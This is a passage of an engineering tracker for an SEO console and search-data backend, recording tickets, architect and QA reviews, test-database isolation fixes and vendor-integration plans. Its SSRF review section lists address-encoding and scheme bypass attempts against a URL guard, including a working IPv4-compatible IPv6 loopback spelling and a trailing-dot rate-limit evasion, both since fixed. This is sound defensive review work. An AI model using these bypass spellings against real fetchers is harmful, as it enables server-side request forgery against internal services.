harmful — it kills a *concurrently running* suite's sessions) and a session advisory lock (did not
converge). The real fix is **per-file database or schema isolation**, which is why this is its own
ticket rather than an edit here.

*Scope note:* the full-repo regression baseline (`639 passed / 1 failed`, CHANGELOG 2026-07-27) is
**not reproducible on this dev machine** while SM-31 stands — a full-suite run gave 241 failed / 54
of 74 files, all of them the same schema artifact. Two contaminants were also cleared during this
gate: stray `vitest run` processes from earlier sessions still dropping the shared schema, and a test
DB left with 90 tables but a single `schema_migrations` row. The per-file protocol in §0 is the
trustworthy measurement until SM-31 lands.

---

## 4e · SM-11 console record (2026-07-28) — **UI pulled forward**

**Order change, deliberate:** the design puts SM-11 at step 6, after the P1 data tickets, so the
console opens onto real audits and clusters. The owner chose UI-first instead, because the department
had no visible surface at all. SM-11's only hard dep is SM-02 (landed), so this is legitimate — the
cost is that 10 of 12 tabs open on a "backend pending" state until P1 lands behind them.

**Built:**
- `platform-ui/src/lib/searchMarketing.ts` — typed BFF client. **Named `searchMarketing`, not
  `search`**: `lib/search.ts` was already the app-wide global-search helper. Documents exactly which
  endpoints exist vs. which ticket owns each missing one; every fetch absorbs 404/403 so a disabled
  module or a Cerbos denial degrades the tab instead of erroring the page.
- `seo` toolkit in `lib/deptToolkits.ts` — first **three**-craft-group console (Accounts / Optimize /
  Campaigns per D-10), on the inherited Home · Work · Connections spine. Slug `seo` matches the
  seeded department name "SEO", so it resolves in the dev stack.
- **Real data:** Engagements list (engagements + properties, metered-tools summary, budgets) and
  engagement detail (status/property/budget, projected-cost KPIs, the **metered-tools table**, the
  over-budget stop-loss warning, `search.scope.write`-gated scope affordance).
- **Honest pending:** 10 tabs render a `PendingCapability` naming the capability, its **cost tier**
  (🟢 free vs 🔵 data-key), the exact missing endpoint and the owning ticket — never an empty table,
  which would read as "no data" when the truth is "this cannot have data yet".
- `components/search/{CostTierBadge,PendingCapability}.tsx`; `lib/searchMarketing.test.ts`.

**Two decisions worth keeping:**
1. The console renders an **absent** toggle and an explicitly `enabled: false` toggle *identically*,
   because dispatch refuses both — pinned by a unit test. The metered-tools table exists mainly to
   answer "why did nothing happen?" before someone files it as a bug.
2. When `cost-projection` does not answer, the KPIs show **"—", never `0`**. A zero would read as
   "this costs nothing", which is the same class of lie as the fail-open the P0 gate just fixed.

**Verification:** `tsc --noEmit` clean · full UI unit suite **537/537** · `next build` **green** with
all 12 new routes registered. Two pre-existing toolkit tests asserted SEO was *unbuilt*; they now
assert the new spine, with the generic-fallback guard repointed at SMM (genuinely still unbuilt) and
a new test that every advertised tab path has a real route.

**Deliberately NOT done** (would have been dishonest to stub): the ticket's "Connections additions".
The SEO console's Connections tab still shows GitHub + Drive only; Search Console / GA4 / Google Ads
entries need the OAuth + token-vault work in **SM-25**, which is externally gated on a Google OAuth
client. Recorded in `docs/FRONTEND-BFF-CONTRACT.md` §14.

### Architect review 2026-07-28 — **REJECTED, then fixed**

The review earned its keep. SM-11 was written frontend-and-backend-in-one-session, and the contract
drifted exactly where that usually drifts. Two blocking defects, both now fixed and re-verified:

1. **A crash on real data.** Postgres `numeric` reaches JS as a **string**. The controller cast
   `provider_budget_usd` in `engagements/:id/scope` and `cost-projection` but **not** in
   `listEngagements`/`getEngagement`, so the same field was a number from one endpoint and a string
   from another — and `formatUsd` called `.toFixed()` on it. The "renders REAL data" tab would have
   thrown `TypeError: n.toFixed is not a function` on the first tenant with one engagement.
   *Fixed at the root:* a shared `moneyOrNull()` in `providers/ledger.ts`, applied at both leaking
   endpoints; plus `formatUsd` now coerces defensively, so a future un-cast endpoint degrades to a
   correct display instead of a runtime error (and junk still renders "—", never "$NaN").
2. **The cost-projection panel was entirely dead.** Real response keys are `totalMonthlyUsd` and
   `perTool[].tool` / `projectedMonthlyUsd`; the UI declared `monthlyUsd` and `perTool[].toggle`. So
   the per-capability cost column and the projected-cost KPI silently rendered "—" — the exact
   "this costs nothing" lie the "—"-never-`0` rule exists to prevent, arriving by a different route.
   *Fixed:* `CostProjection` retyped to the controller's real envelope, and both page call sites
   corrected.

Five non-blocking drifts also fixed while there: status `ended`→**`closed`** (the real CHECK value),
`startedAt`→**`startsOn`/`endsOn`**, and `SearchProperty.displayName`/`kind` + `SearchKpiTarget.metric`/
`period` replaced with the columns that actually exist (`siteUrl`/`verifiedAt`/`status`,
`metricKey`/`duePeriod`) — each had been rendering a permanent "—". The Properties table now shows
real columns.

**Self-inflicted break caught in re-verification:** inserting `moneyOrNull` above
`sumGlobalMonthToDate` shifted its line number, and the `lint-withtenants` allowlist is keyed by
**file + line** — so the ratified exemption silently stopped matching and the lint failed. Entry
re-pointed (70→80) with a note that this coupling exists. Arguably the right bias: a shift forces a
re-look.

**SM-04 verdict: APPROVE-WITH-NOTES.** The fail-closed direction was upheld and the allowlist
ratification **confirmed** — but two of my claims were correctly knocked down, and they are recorded
as follow-ups rather than quietly dropped:
- My comment asserts a failure here means "a permission/logic fault, not a blip". That **overclaims**.
  `sumGlobalMonthToDate` does an unindexed cross-tenant scan (unbounded `SELECT id FROM companies`,
  then a `date_trunc` SUM with no supporting expression index) and takes **two** sequential pool
  checkouts where the rest of dispatch takes one — so a statement timeout or pool exhaustion hitting
  only this aggregate is genuinely plausible as `search_provider_calls` and the company count grow.
  Worse than I framed it: it runs **before** the cache critical section, so the blast radius is every
  dispatch *attempt*, including pure cache hits. Follow-up: a 30–60s TTL cache on the global sum (a
  strictly smaller relaxation than the per-call race the code already accepts) or a supporting index.
- The read-only/aggregate-only invariant is **documented, not enforced** — `lint-withtenants` only
  inspects the first-argument shape and has zero SQL awareness, so a future edit could turn that
  callback into a row read with the lint still silent. Follow-up: a shape-assertion test on the SQL.
- Minor: the `recordBlocked` call on the new path is unguarded, so if the same fault also breaks that
  INSERT the caller sees a raw error instead of the typed `GlobalCeilingUnavailableError` — still
  fail-closed, but muddies `instanceof` for future callers.

**Re-verified after all fixes:** UI **542/542** · search suites **126/126** (per-file, DB reset each)
· both `tsc --noEmit` clean · `lint:withtenants` clean. One pre-existing flake confirmed unrelated:
`ControlsTab.test.tsx` fails under parallel load but passes 10/10 three times in isolation and has
zero references to any changed file.

### QA gate 2026-07-28 — **PASS**, after a real crash was found and fixed

Driven with a real browser session (`DEMO_MODE=1` on port 3011; 3000/3005 were occupied), logged in,
company switched to the seeded agency where SEO is `dept-3`. **All 19 routes swept 200 and clean**
(the 12 SEO tabs + engagement detail + the Work-group tabs), twice, with no hydration errors, no
unhandled rejections and no nav-advertised route 404ing. Each pending tab was confirmed to name its
owning ticket. Regression checks passed: Web Dev and Creatives consoles unaffected by the new toolkit
registration, the generic Home-only fallback still works (Social Media), and a company with zero
departments renders its empty state rather than crashing.

**The gate earned its keep — one of the 12 routes was permanently broken.** Engagement detail crashed
for *every* id under `DEMO_MODE=1`:

```
TypeError: Cannot read properties of undefined (reading 'toLowerCase')
    at normalizeStatus (src\components\ui.tsx:40:12)  ← via StatusBadge label={engagement.status}
```

Root cause was a **wrong-shaped 200**, not a missing one. The demo-fixture catch-all answered
`GET .../engagements/:id` with `[]` — an empty ARRAY, 200 OK. An array is truthy, so `skipUnavailable`
never saw a 404, `if (!engagement) notFound()` sailed past it, and the first property access died.
The generic error boundary turned that into "Something went wrong" instead of a clean 404.

Fixed in two places, because the fixture fix alone would have left the real hazard in place:
1. **Fixtures** (QA): dedicated `/modules/search/*` demo stubs — two seeded engagements (one fully
   populated, one deliberately *without* a cost projection) — plus explicit 404s for the genuinely
   unbuilt sub-paths so those tabs show BackendPending **by intent rather than by accident**.
2. **Product code** (me, on QA's recommendation): `asObject()` / `asArray()` shape guards on every
   fetcher in `lib/searchMarketing.ts`. A 200 carrying the wrong shape now degrades to absent/empty
   instead of crashing. This matters beyond demo mode — a backend contract violation would have
   reproduced the same crash in production, and today's architect review proved this contract *does*
   drift.

**Design decisions re-verified in RENDERED output** (not just unit tests, which was the point):
money from a numeric-as-**string** fixture (`"150.000000"`) renders `$150.00` — no `$NaN`, no crash,
confirming the `formatUsd` coercion live; per-capability costs and the KPI total match the fixture
figures exactly, proving `perTool[].tool` / `projectedMonthlyUsd` / `totalMonthlyUsd` are wired right;
`backlinks: {enabled:false}` and an **absent** `ai_visibility` render **identically**; and the
engagement with no projection shows "—" / "did not answer" / "Unknown", **never `$0.00` or "No"**.
The Properties table shows real columns (domain / site URL / verified / status).

**One item honestly marked UNTESTABLE rather than passed:** the literal *live-backend* 404/403 path.
`DEMO_MODE=1` bypasses the network entirely by construction, so it cannot exercise it, and direct
calls to the running `:3004` returned 500 on every authenticated request — including a known-good
non-search endpoint. QA attributed that to concurrent work in `platform-nest`, but that is unlikely to
be the cause: the container runs a **built image**, so editing source does not affect it. The
probable cause is the already-recorded staleness of that deployment (memory `ui-backend-wiring-2026-07-16`:
the running backend predates migrations 0018-0020). Either way the 404/403 degrade is proven at the
fixture level and by the shape guards, and unproven against the live stale backend — worth one check
after a redeploy, not a blocker.

**Re-verified after the hardening:** `tsc` clean · UI **542/542** · `next build` green, 12 routes.

**SM-11 gate status: both halves discharged** (architect + QA). Still owed before it is fully
LANDED: **SM-29**, the editable scope grid the detail page currently only *describes*.

---

## 4f · SM-09 decisions needing a reviewer's call (2026-07-28)

Flagged by the implementer rather than buried — the first is the one that matters:

1. ⚠️ **Cerbos gating for the new AI operations.** `resource_search_keyword.yaml` (SM-03) has no
   `embed`/`cluster` action, so `/embed` and `/cluster` were gated under the existing **`update`**
   action, same as a manual keyword edit. That keeps the diff app-layer-only as instructed, but it
   means *anyone who may edit a keyword may also spend gateway compute on a 1k-keyword set*. Those are
   not obviously the same privilege. Needs an architect decision: accept, or add dedicated Cerbos
   actions (a policy change, hence its own ⚡ gate).
2. `/embed` and `/cluster` on a set outside the caller's tenant return **404** (matching the sibling
   get/delete handlers) rather than 400 (the bad-FK-on-create pattern). Consistent with the closest
   precedent; noted so the inconsistency across the controller is deliberate, not accidental.
3. **One `/embed` HTTP call per keyword** — the gateway's `/embed` takes a single `text` and has no
   batch endpoint. Bounded for paste/CSV imports, but 1k keywords is 1k round trips; if bulk keyword
   sources arrive later (SM-14/15), a batch endpoint on the gateway becomes worth having.
4. Clustering cutoff **cosine ≥ 0.82**, exposed as an optional per-call `threshold`. Not specified in
   the design; tunable without touching persistence shape.

---

## 4g · ⚡ P1 gate — SM-07 + SM-09 (2026-07-28/29) · **BOTH CLEARED**

**SM-09 — architect APPROVE-WITH-NOTES · QA PASS.**
**SM-07 — architect APPROVE · QA initially FAILED it, found 2 real defects, both now fixed.**

Final state: platform-nest **79 files / 785 tests**, `tsc` clean, `lint:withtenants` clean (106 files);
`search-crawl-go` build + vet + test green — all independently re-verified, not taken on report.

### The SSRF gate earned its "mandatory" label

QA attacked the guard beyond its original 12 cases and published the full attempt list — which is the
real deliverable for an SSRF review, since "looks fine" is a failed review. **Held:** octal/hex/decimal
IPv4 encodings, case sensitivity, suffix-vs-subdomain confusion (`notexample.com` vs `example.com`),
TOCTOU re-resolution, `file://`/`gopher://`/`ftp://`, non-standard ports, redirect count cap,
cross-tenant allowlist widening, unbounded crawl duration/fan-out, IPv4-mapped IPv6. **Two got through:**

1. **`isDeniedIP` missed the deprecated IPv4-COMPATIBLE IPv6 form** (RFC 4291 §2.5.5.1) — `::7f00:1`
   is 127.0.0.1, but `net.IP.To4()` only unwraps the *mapped* (`::ffff:`) form, so the `IsPrivate` and
   `isCGNAT` branches (both gated on `To4() != nil`) skipped it while `IsLoopback`/`IsLinkLocalUnicast`
   compare bytes and missed it too. The classifier called it **public**. Honestly rated
   low/theoretical — modern kernels no longer route this form — but a function whose entire job is
   "deny every spelling of a private address" must not depend on OS behaviour to stay safe. **Fixed**
   by decoding the compatible form and recursing, with `::`/`::1` excluded so they aren't re-read as
   0.0.0.0/0.0.0.1.
2. **Rate-limiter host key skew — reachable, not theoretical.** `hostAllowed` stripped the FQDN
   trailing dot; `RoundTrip` only lowercased. So `site.example` and `site.example.` were ONE host to
   the allowlist but TWO independent budgets to the pacing layer — an allowlisted target could
   alternate the dot across same-host redirects and pace itself out of our own politeness cap
   (redirects never pass the crawler's off-host filter, which only runs on discovered `<a href>`).
   Not an SSRF hole, but it defeats the explicit "limit at RoundTrip so keep-alive can't dodge it"
   design intent. **Fixed** — and fixed at the cause: a single shared `normalizeHost()` now serves
   every host-keyed layer, because duplicated inline normalization *is* what drifted.

QA's two failing tests were the acceptance check; both now pass.

### The Cerbos decision (§4f item 1): **ACCEPT `update`** — do not add dedicated actions

The architect overturned my concern with repo evidence, and the reasoning is worth keeping:
`resource_search_keyword.yaml` **already grants `research`** — the genuine real-vendor-dollar paid pull
— to `module_staff` at the same baseline tier as read/create/update, with the policy header stating the
ratified principle that spend is an **application-layer** stop-loss concern, not a Cerbos one. Elevated
actions elsewhere (`set_scope`, `launch`, `set_budget`) gate changing spend *policy* or executing a
*live external* mutation; embed/cluster do neither. Design §07 already types `search.clusterKeywords`
as **"AI draft | low"**, not "paid pull | budget-checked" — and embed/cluster never enter the SM-04
metered path at all (they call the gateway directly, never `dispatchProviderOp`). So `update` is not a
shortcut; elevating would be an ad hoc tightening not grounded in any risk Cerbos controls.

**The real risk was different, and the architect said so rather than accepting my framing:** narrowing
*who* may call embed/cluster would not bound *how much* one call does. See SM-32.

### Deferred, ticketed rather than silently accepted

- **SM-32 · Bound keyword-set cardinality** (tier `medior`). No cap at `/import`, `/embed` or
  `/cluster` — `clustering.ts` selects the whole set with no `LIMIT` (unlike `listKeywords`, which caps
  at 5000) and fires **one sequential awaited gateway call per keyword**, then one per cluster. Worse,
  `withTenants` wraps the callback in a real `BEGIN…COMMIT`, so one pooled DB connection is held open
  for the entire sequential network loop — a few concurrent large imports could exhaust the pool, and a
  hiccup at keyword 999/1000 rolls back all 999. Add a `MAX_KEYWORDS_PER_SET` bound and reconsider
  holding one transaction across N network calls. Not blocking (the 1k AC is met and well-proven), but
  fix before real client usage or before SM-14/15/16 bring bulk keyword sources.
- **Defect: `parseKeywordImport` corrupts a comma inside a quoted CSV field.** `keyword-import.ts`
  splits on `,` before any quote awareness, so `"running, jogging shoes",en-US` yields garbage rather
  than one field or an error; an embedded newline in a quoted field splits into two bogus rows the same
  way. Real but non-security and pre-existing to this gate. QA pinned the *current wrong* behaviour in
  tests so it cannot drift further unnoticed, with the intended behaviour left as the fix target. Needs
  a quote-aware split (small state machine or a CSV lib). Tier `medior`.
- **Global-ceiling TTL cache is per-process.** If platform-nest ever runs multi-instance, effective
  staleness is "30s per instance", not platform-wide. Proportionate to a $150/mo soft ceiling; wants an
  ops-runbook line, not a redesign.

### SM-04 carry-overs — all three applied and verified

TTL cache (30s, in-process) chosen over an index because an index alone would still leave two pool
checkouts on every dispatch; the read-only/aggregate-only invariant is now **enforced by
`ledger.test.ts`** parsing the exported SQL rather than merely documented in a comment — closing a gap
`lint-withtenants` structurally cannot cover, since it classifies the tenant array, not the SQL; and
`recordBlocked` is guarded so a failing audit write can no longer mask `GlobalCeilingUnavailableError`.
The `lint-withtenants` allowlist line was re-pointed 80 → 124 (same entry, not a duplicate) — exactly
the file+line fragility already flagged in this tracker.

---

## 4h · SM-32 + CSV-quoting defect — **FIXED 2026-07-29** (verified 42/42)

**Cap:** `SEARCH_MAX_KEYWORDS_PER_SET`, default **1000** — set *at*, not above, the exact scale the
SM-09 AC already proves deterministic end-to-end. That is the only size this pipeline has been
verified at for both clustering determinism and held-transaction duration, so a larger set is
**refused with a 400 naming the limit, never silently truncated** (truncation is data loss wearing
the costume of success). Enforced at `/import` (existing + incoming counted, so a set cannot creep
over the cap across several under-cap imports) and again in `embedKeywordSet`/`clusterKeywordSet`
via a pre-read `COUNT(*)`, with a `LIMIT` on the select as defence in depth.

**Transaction: kept as ONE, deliberately.** Chunked commits were considered and rejected — the
implementer verified first that `embedViaGateway` has no side effect beyond its own `UPDATE` and
that `onlyMissing: true` makes a retry-after-partial-failure naturally idempotent, so chunking would
have bought a smaller blast radius but *not* correctness. With the cap now fixed at 1000 the worst
case is bounded. The doc comment records the trigger to revisit: raising the cap meaningfully above
the proven AC size.

**CSV parser rewritten** as a single quote-aware state machine running over the whole input *before*
any row/column splitting — the old code split on `\n` then `,` first, which is why quoting could
never work. Now: commas inside quotes stay in one field; a quoted embedded newline stays one row;
`""` decodes to a literal `"`; an unterminated quote raises `UnterminatedQuoteError` → 400 rather
than mangling or hanging. QA's two tests that pinned the *wrong* behaviour were flipped to assert the
correct behaviour, as intended — not deleted.

---

## 4i · SM-29 scope editor + the frontend-first drift pattern (2026-07-29)

**SM-29 AC discharged.** The engagement detail page's read-only "Metered tools" table and its
"coming in SM-29" placeholder are replaced by a real `<ScopeEditor>`: per-tool enable/cadence/limit,
preset picker, budget editor, live per-toggle and total cost, and an over-budget comparison against
the *unsaved* budget. Verified by me: `tsc` clean, UI **559/559**, `next build` green; the agent
additionally drove it in a browser (toggle → preview $15.71→$18.71; budget → $2 → "Over budget …
UNSAVED"; save → persisted; reload → held), and confirmed `sm-eng-2`'s deliberately-missing
projection still renders "—" throughout rather than `$0`.

Pricing still comes exclusively from the backend's own what-if `cost-projection?toolScope=<json>`.
Only the preset *seed shapes* are mirrored client-side, and that mirror is documented as
seeding-only — a drift there mis-previews a preset before save, and the PUT re-seeds authoritatively
anyway.

### ⚠️ The pattern worth remembering: three frontend-first drift bugs in one module, one day

All three shared a signature — **the console read a field the backend never sent, got `undefined`,
and rendered a confident wrong answer. Nothing threw.** Type-checking cannot catch it, because the
types were the thing that was wrong; and demo fixtures actively *hide* it, because a fixture written
from the same wrong assumption agrees with the code.

1. `ToolScopeToggle.limit` was invented in SM-11. The real fields are `maxKeywords`/`maxQueries`
   (`providers/dispatch.ts`'s `itemsPerRun`). The estimator silently ignores `limit` and falls back
   to its own default — so a human setting a cap in the UI would have changed **neither the price
   nor the pull size**. Now fixed, with a `TOGGLE_LIMIT_FIELD` map so the UI and the estimator
   cannot disagree about which field a "limit" input writes.
2. `getEngagementScope` was typed as a bare toggle map; the real envelope is
   `{scopePreset, toolScope, providerBudgetUsd}`. Against the real backend **every toggle would have
   read as absent → every capability rendered "blocked"**. It looked correct only because the demo
   fixture was a bare map too. Fixture and types corrected together.
3. The engagement **LIST** never selected `tool_scope`, so the console's "N of 5 metered tools on"
   was **always 0** — precisely the state that sends an operator hunting in the scope editor for a
   problem that does not exist. Fixed in `search.controller.ts` and **pinned by a regression test**
   asserting the LIST agrees with `GET .../scope`.

**The lesson, recorded because it will recur:** for this module, verify a UI field against the
*controller's actual SELECT and response envelope*, never against a fixture and never against the
TypeScript interface. Bug 2 in particular means SM-11's earlier QA pass was partly validating a
fixture built to the same wrong assumption as the code.

**Also found and fixed en route** (both real, both in `platform-ui`): `lib/searchMarketing.ts` had to
be split (`searchMarketingShared.ts`) because it imports the `"server-only"` `lib/platform.ts`, which
broke the build the moment a client component imported a single constant transitively; and the demo
fixtures' in-memory scope store had to become file-backed, because Next.js splits a Server Action's
chunk from the page-render chunk, so a save mutated one chunk's object and was invisible to the
other — a demo-only artifact that read exactly like "saving silently reverts".

---

## 5 · Blockers & external gates

| Gate | Blocks | Owner action | Status |
|---|---|---|---|
| OQ-2 · $50 DataForSEO deposit | SM-05 real-data AC, SM-14/15/16 | fund the account | open |
| Google OAuth client (GSC/GA4/Ads) + real property + Ads test account | **SM-41G staging acceptance + SM-26's real push ONLY** — construction unblocked 2026-07-30 (§6x.3, §A12: SM-51 sandbox + local Keycloak) | create in Google Cloud console | open |
| pgvector extension | SM-09 native-vector mode (fallback works) | enable on PG | open (OQ-8) |
| Semrush MCP OAuth | SM-28 only (deferred anyway) | authorize in claude.ai connector settings | open |
| OQ-5 Umami | SM-27 only (deferred) | decide deploy vs defer | open |

None of these block M1 or M2.

### SM-31 — **RESOLVED 2026-07-28.** The full-suite number is obtainable again

**Fix:** per-file physical database isolation in `src/testing/setup.ts` — each test file gets
`pgtest_f_<sha1(testPath)>`, created via `DROP DATABASE IF EXISTS … WITH (FORCE)` + `CREATE DATABASE`
against a short-lived maintenance pool. Public API unchanged (`initTestDb`/`teardownTestDb`/
`adminPool`/`TEST_URL`), no suite content touched. Deterministic naming means a crashed run's leftover
DB is simply recreated next time, so the count stays bounded — **verified: 60 databases for the 60
files that call `initTestDb()`, unchanged after repeated full runs.** Note the earlier
`pg_terminate_backend` dead end becomes safe here for a structural reason: with no two files sharing a
database, `FORCE` can only ever disconnect that one file's own stragglers, never a live sibling suite.

**A shared-database fix was tried and rejected mid-ticket** (a vitest `globalSetup` that reset the
schema once before any worker). It removes the CASCADE race but keeps one physical DB for all 74
files, and that cannot survive a full run: `users.email` is globally `UNIQUE` (0001) while 22 test
files `INSERT` the same literal fixture email `admin@a.test` with no upsert. Two of them in one shared
database collide — which is why the old harness only ever worked one file at a time, the exact symptom
this ticket existed to fix. Superseded; `global-setup.ts` deleted and `vitest.config.ts` reverted.

**Verified independently (not on the agent's report):** `74 passed (74)` files / **`734 passed (734)`
tests in ONE `npx vitest run`** — the first trustworthy full-suite number this session. `tsc` clean,
`lint:withtenants` clean, public API confirmed intact by inspection.

**Consequence for §0:** the one-file-at-a-time protocol is **retired**. Run the suite normally.

**Follow-up found + fixed same day — `TEST_DB_PREFIX`.** The per-file name was derived purely from
the test path, so it did not vary by RUN. Two concurrent `vitest run` invocations against the same
Postgres therefore computed the **same** database name, and the second one's
`DROP DATABASE … WITH (FORCE)` yanked the first's schema mid-run — the original SM-31 bug, relocated
from concurrent files to concurrent runners. It bites two agents, two developers, or two CI jobs
sharing this server, and it would have looked exactly like flaky tests. `perFileDbName()` now honours
an optional `TEST_DB_PREFIX` (default `pgtest_f`), lowercased and sanitised. Determinism holds within
a prefix, so the bounded-database property survives.

⚠️ **Whenever two agents/runners share this Postgres, each MUST set a distinct `TEST_DB_PREFIX`.**

The lowercasing is not cosmetic: Postgres folds unquoted identifiers, so a mixed-case prefix was
CREATEd as one name and connected to as another. That surfaced as `beforeAll` throwing — which vitest
reports as **"15 skipped"**, not as a failure. Caught only because the expected databases were absent
afterwards. It is the same silent-skip trap already noted in §0: read file-level results, never just
the totals.

**Also of note:** the `admin/bot-admin.test.ts` failure this tracker had been carrying as "known
pre-existing" **no longer fails** — that file has substantial uncommitted changes from the separate
session that owns it, which evidently fixed it. Not this ticket's doing, and the fix is not ours to
claim. ⚠️ The workspace currently holds significant uncommitted work in flight from other sessions
(ai-gateway-go, mcp-hub, admin/systems, bot-admin, compose files): **do not run `git checkout`/`reset`**
anywhere near it.

---

### SM-31 (original ticket text, kept for the record) — tier `senior-be` (or `senior-db`)

Off-design ticket, created 2026-07-28 at the P0 gate (§4d, Finding 2). **Not a search ticket** — it
is repo-wide platform-nest test infrastructure, and it currently makes the full-suite regression
number unobtainable on this dev machine, so it gates any future claim of "full suite green".

- **Problem:** `src/testing/setup.ts` destructively resets (`DROP SCHEMA public CASCADE`) a test
  database shared by all 74 suites. One leaked connection deadlocks the next suite's drop and
  corrupts `schema_migrations` relative to the actual tables, cascading into every later file.
- **Fix direction:** per-file isolation — a database or schema per test file (e.g. derive the name
  from the worker/file id), so no suite can drop another's schema. Ensure teardown always runs and
  cannot leave a connection idle-in-transaction.
- **Do not retry:** `pg_terminate_backend`-before-drop (kills concurrently-running suites) or a
  session advisory lock (did not converge). Both were tried at the gate.
- **AC:** the whole platform-nest suite runs green in ONE `npm test` invocation, three times
  consecutively, with no DB reset between runs; the §0 one-file-at-a-time workaround is retired; CI's
  `platform-nest` job still passes.
- **Known real failure to preserve, not mask:** `admin/bot-admin.test.ts` "chats: list + thread
  proxies…" (`threadBody.chatId` undefined) is a genuine pre-existing WhatsApp-admin-proxy break,
  unrelated to search and being handled elsewhere.

---

## 6 · Wave 2 tickets — multi-vendor + simulation (owner directive 2026-07-29)

Three owner constraints, recorded in intent:

1. **No live vendor API until staging.** Dev must show real-looking results and data from a
   simulation, not from empty tables. This *dissolves* the OQ-2 deposit gate as a blocker for
   everything except final real-data acceptance — P2 surfaces can now be built and demoed.
2. **The team already uses Semrush + Ahrefs, and is considering DataForSEO.** All three must be
   integration-ready. (Plus Claude/AI — already satisfied: `ai-gateway-go` is sole AI egress.)
3. **Reuse MCP Hub + AI Gateway. Do not re-implement their logic anywhere in this module.**

### SM-33 ⚡ · Simulation provider mode — tier `senior-be`

Replace the flat test stub with a *believable* simulator, and make simulated data structurally
impossible to mistake for real data.

- `providers/simulation.ts` — `createSimulationProviders(): SearchDataProvider[]`, one driver per
  vendor key (`dataforseo`/`semrush`/`ahrefs`), so the SM-36 preference cascade is exercisable in
  dev. Each advertises **only the capabilities its real vendor has** (see SM-34/35) — a simulator
  that can do everything would hide capability-routing bugs.
- **Deterministic, seeded from the query string** (not random, not constant): volume on a
  plausible long-tail distribution, CPC correlated with commercial intent, difficulty correlated
  with volume, SERP with the tracked property placed at a stable position, backlink profiles
  scaled to domain, AI-visibility citation state varying by engine. Same input -> same output,
  forever, so tests and demos are reproducible. Slight per-vendor divergence on the same query
  (real vendors disagree) — that is a feature, not noise.
- Flows through the **real** `dispatchProviderOp`: cache, single-flight, pillar/scope/ceiling/budget
  gates, ledger rows with synthetic dollars. The money path must be demonstrable end-to-end.
- **Provenance is the AC that matters.** Migration `0047`: a `simulated boolean` on
  `search_provider_calls` and on `search_data_cache`. Dispatch stamps it. It surfaces on
  ledger/cost-projection responses. A simulated cache row must **never** be served as real after a
  mode flip — key the cache on mode, or refuse cross-mode reads. State which and prove it.
- Owns: `providers/simulation.ts`, its test, migration 0047, provenance in `dispatch.ts`/`ledger.ts`.
  **SM-34 owns config/main/types wiring.**
- AC: mode off -> today's behaviour byte-for-byte; mode on keyless -> all 5 op kinds return shaped
  data, ledger accrues, a budget cap still refuses; every simulated row is flagged; no simulated row
  can be read as real.

### SM-34 · Semrush driver + SM-35 · Ahrefs driver — tier `senior-be` (one agent, same edit surface)

Both behind the **unchanged** `SearchDataProvider` interface — no money logic duplicated, drivers
only speak HTTP, normalize envelopes, and price ops. Mock-server tests with an injected `fetchImpl`;
**no network, no credentials, no vendor account needed to pass.**

- `providers/semrush.ts` — Analytics API v3 (`api.semrush.com`). Capabilities: `volume`,
  `difficulty`, `backlinks`, `competitors`, `serp` (via organic-positions reports).
- `providers/ahrefs.ts` — API v3 (`api.ahrefs.com/v3`). Capabilities: `backlinks` (its strength),
  `volume`, `difficulty`, `competitors`, `serp` overview.
- **Unit-billing normalization is the hard part.** DFS bills USD directly; Semrush bills *API units*
  and Ahrefs bills *API units/rows* against a subscription. `estimateCostUsd` is a stop-loss input
  and must stay pure + synchronous, so each driver converts units -> USD via a configured
  `costPerUnitUsd` (subscription price / monthly unit allowance) with the derivation written down.
  A wrong conversion here silently mis-arms the budget stop-loss — that is the review focus.
- Owns the wiring surface for the whole wave: add `"ahrefs"` to `ProviderKey`, `config.search.
  {semrush,ahrefs}` credential blocks, `config.search.providerMode` (`live` | `simulate`, default
  **`live`** so nothing changes by accident), `main.ts` registration (per-vendor keyless-disable
  logs, and `createSimulationProviders()` registration when mode is `simulate`), all three
  `.env.example`s + `docker-compose.vps.yml`.
- AC: every capability parses from a mocked envelope; rate tables asserted constant-by-constant with
  the unit->USD derivation in a comment; keyless per-vendor disable proven independently (Semrush
  keys present + Ahrefs absent = Semrush registered, Ahrefs not); vendor error envelopes and 200s
  carrying errors handled; **no response body in error messages** (can carry account identifiers).

### SM-36 ⚡ · Per-capability provider preference — tier `medior`

`resolveProvider` today picks per **op kind**, then falls back to one platform default. With three
vendors that is too coarse: the right answer is per-capability (backlinks->Ahrefs, volume->Semrush,
serp->DFS) with an ordered fallback list, expressible per engagement and per tenant. Must preserve
the existing fail-closed rule: an *explicit* per-tool override is an operator instruction — honor it
or refuse; never silently substitute a different vendor. Depends on SM-34/35 landing.

### SM-37 · SEO department demo seed — tier `junior`

`src/seed/search.ts` + `seed:search` script: one engagement with property, keyword sets with
clusters and intent labels, an ingested audit with findings across severities, KPI targets, a
content brief. Idempotent, matching `seed:agency`'s pattern. This is what makes the console show a
populated department instead of a set of empty states.

### SM-38 · Simulated-data badging in the console — tier `senior-fe`

Every surface rendering provider-sourced data shows a `SIMULATED` chip when the row's provenance
says so, and the engagement header states the platform mode. Non-negotiable in this module, for the
same reason the "—, never $0" rule exists: **an unlabelled plausible number is the most expensive
kind of lie.** Depends on SM-33's provenance field.

### SM-39 · MCP / AI-gateway boundary ruling + reuse audit — tier `senior-integrator`

Record the ruling and prove the code obeys it: vendor SEO APIs are reached **only** through
`SearchDataProvider` drivers; AI is reached **only** through `ai-gateway-go`; MCP Hub exposes *our*
`search.*` tools to agents and is never a client-side transport for a vendor. Concretely: verify the
18 `search.*` mcpTools actually aggregate through `GET /mcp/tool-defs`, and re-scope **SM-28**
(Semrush MCP) from "premium driver" to "deferred — superseded by the SM-34 HTTP driver", so we do
not end up with two Semrush paths and two cost meters.

---

### Addendum ratified — 2026-07-29 (architect)

**Doc:** [`seo-sem-design-addendum-providers.md`](./seo-sem-design-addendum-providers.md) — amends
design §05/§12 + foundation §8a. Rulings, one line each (the addendum section is authoritative):

- **Phase plan (§A1):** OQ-2 demoted to a *staging* gate; P2 (SM-14/15/16/17) builds against SM-33
  simulation; every real-data clause moves to new SM-41. §0/§1 P2 row edits owed by SM-39.
- **Matrix (§A2):** serp→DFS (no fallback — refuse) · volume→Semrush · difficulty annotated,
  never blended, rides the volume provider · suggestions→DFS→scraper · backlinks→Ahrefs ·
  competitors→Semrush · ai_visibility→DFS (no fallback). Conflicts: one source per capability per
  engagement, provider-labelled everywhere, second source internal-compare only, never in client
  reports — binding AC on all UI tickets.
- **Cost model (§A3):** prepaid vendors priced at amortized standard unit rates (plan ÷ allowance);
  ledger = cost-to-serve, not cash; unset unit rate ⇒ driver NOT registered (never $0); estimates
